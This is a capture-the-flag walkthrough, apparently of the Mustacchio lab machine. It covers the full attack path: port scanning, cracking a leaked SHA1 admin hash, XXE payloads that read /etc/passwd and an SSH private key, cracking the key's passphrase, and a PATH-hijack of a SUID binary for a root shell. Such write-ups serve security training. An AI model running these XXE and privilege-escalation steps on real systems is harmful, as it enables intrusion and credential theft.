let's start with a nmap scan. normal nmap scan found port 80 webserver called Mustacchio and port 22 ssh open running ubuntu. 

Let's try to running a full nmap scan for see more ports are open above the port 1000.

---web---

```
# Nmap 7.91 scan initiated Sat Jun 12 14:57:25 2021 as: nmap -sC -sV -p- -oN scans/nmap-allports 10.10.236.36
Nmap scan report for 10.10.236.36
Host is up (0.15s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d3:9e:50:66:5f:27:a0:60:a7:e8:8b:cb:a9:2a:f0:19 (RSA)
|   256 5f:98:f4:5d:dc:a1:ee:01:3e:91:65:0a:80:52:de:ef (ECDSA)
|_  256 5e:17:6e:cd:44:35:a8:0b:46:18:cb:00:8d:49:b3:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 12 15:07:37 2021 -- 1 IP address (1 host up) scanned in 611.67 seconds
```
We found nginx page in port 8765. let's see what is in there. 

---login----

Looks like we found a login page. Let's put that port away and let's enumerate port 80 first. After run gobuster I found this directory on port 80. **http://10.10.236.36/custom/js/** In this you can see this **user.bak** file.

---user.bak---

After we open it we can see this hash.

admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Let's crack it through **hashcat**. Here is the my command to hashcat.

```bash
hashcat -a 0 -m 100 hash1.txt /opt/seclist/rockyou.txt
```
Output :

```
Dictionary cache hit:
* Filename..: /opt/seclist/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldo***
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA1
Hash.Target......: 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
Time.Started.....: Sat Jun 12 16:34:48 2021 (0 secs)
Time.Estimated...: Sat Jun 12 16:34:48 2021 (0 secs)
Guess.Base.......: File (/opt/seclist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5658.1 kH/s (0.24ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 688128/14344385 (4.80%)
Rejected.........: 0/688128 (0.00%)
Restore.Point....: 684032/14344385 (4.77%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: bultaco -> blah2007

Started: Sat Jun 12 16:34:35 2021
Stopped: Sat Jun 12 16:34:50 2021
```
Let's login in with our credentials. After login we can see this page.

----after login---

when we look at our hint. It says look at the page source. You can find this html comment on page source.

--hint---

when we go to that **dontforget.bak**. you can see this xml code. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```
Looks like we can execute a xxe attack. After some time I got a /etc/passwd.

Documentation : https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>

  <com>&xxe;</com>
</comment>
```

---passwd---

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>

  <com>&xxe;</com>
</comment>
```
---id rsa--------

Now we got the id_rsa. Look into the page source for proper formatted key. 

---id_rsa page--------

Looks like we need a passphrase to id_rsa. Let's crack it with **john the ripper**. First you need to make a hash throught ssh2jhon. If you don't know how to do it. 
This blog post will help you :
https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/

```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/Mustacchio]
└──╼ $john --wordlist=/opt/seclist/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2021-06-13 09:19) 0.4566g/s 6548Kp/s 6548Kc/s 6548KC/sa6_123..*7¡Vamos!
Session completed
```
We got our passphrase. Let's ssh to our machine.

```bash
ssh -i id_rsa barry@10.10.24.119
Enter passphrase for key 'id_rsa': urieljames
```
In **/home/barry** we can get our user flag. Let's get into the root. 

```bash
barry@mustacchio:~$ find / -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```
```bash
barry@mustacchio:~$ cd /home/joe
barry@mustacchio:/home/joe$ ls -la
total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12 15:48 .
drwxr-xr-x 4 root root  4096 Jun 12 15:48 ..
-rwsr-xr-x 1 root root 16832 Jun 12 15:48 live_log

```
so what we can do, let’s change the path variable and create a tail with some malicious code to get us root. let’s do it.

so first I’m going to create a file called tail and create a script that gives us a root shell

echo /bin/bash -i > tail
export PATH=/tmp:$PATH
 chmod +x tail
cd joe/
./live_log 

```bash
barry@mustacchio:/home/joe$ cd /tmp
barry@mustacchio:/tmp$ ls
barry@mustacchio:/tmp$ echo /bin/bash -i > tail
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ chmod +x tail
barry@mustacchio:/tmp$ cd /home/joe
barry@mustacchio:/home/joe$ ./live_log 
root@mustacchio:/home/joe# ls
live_log
root@mustacchio:/home/joe# cd /root
root@mustacchio:/root# ls
root.txt
root@mustacchio:/root# cat root.txt


```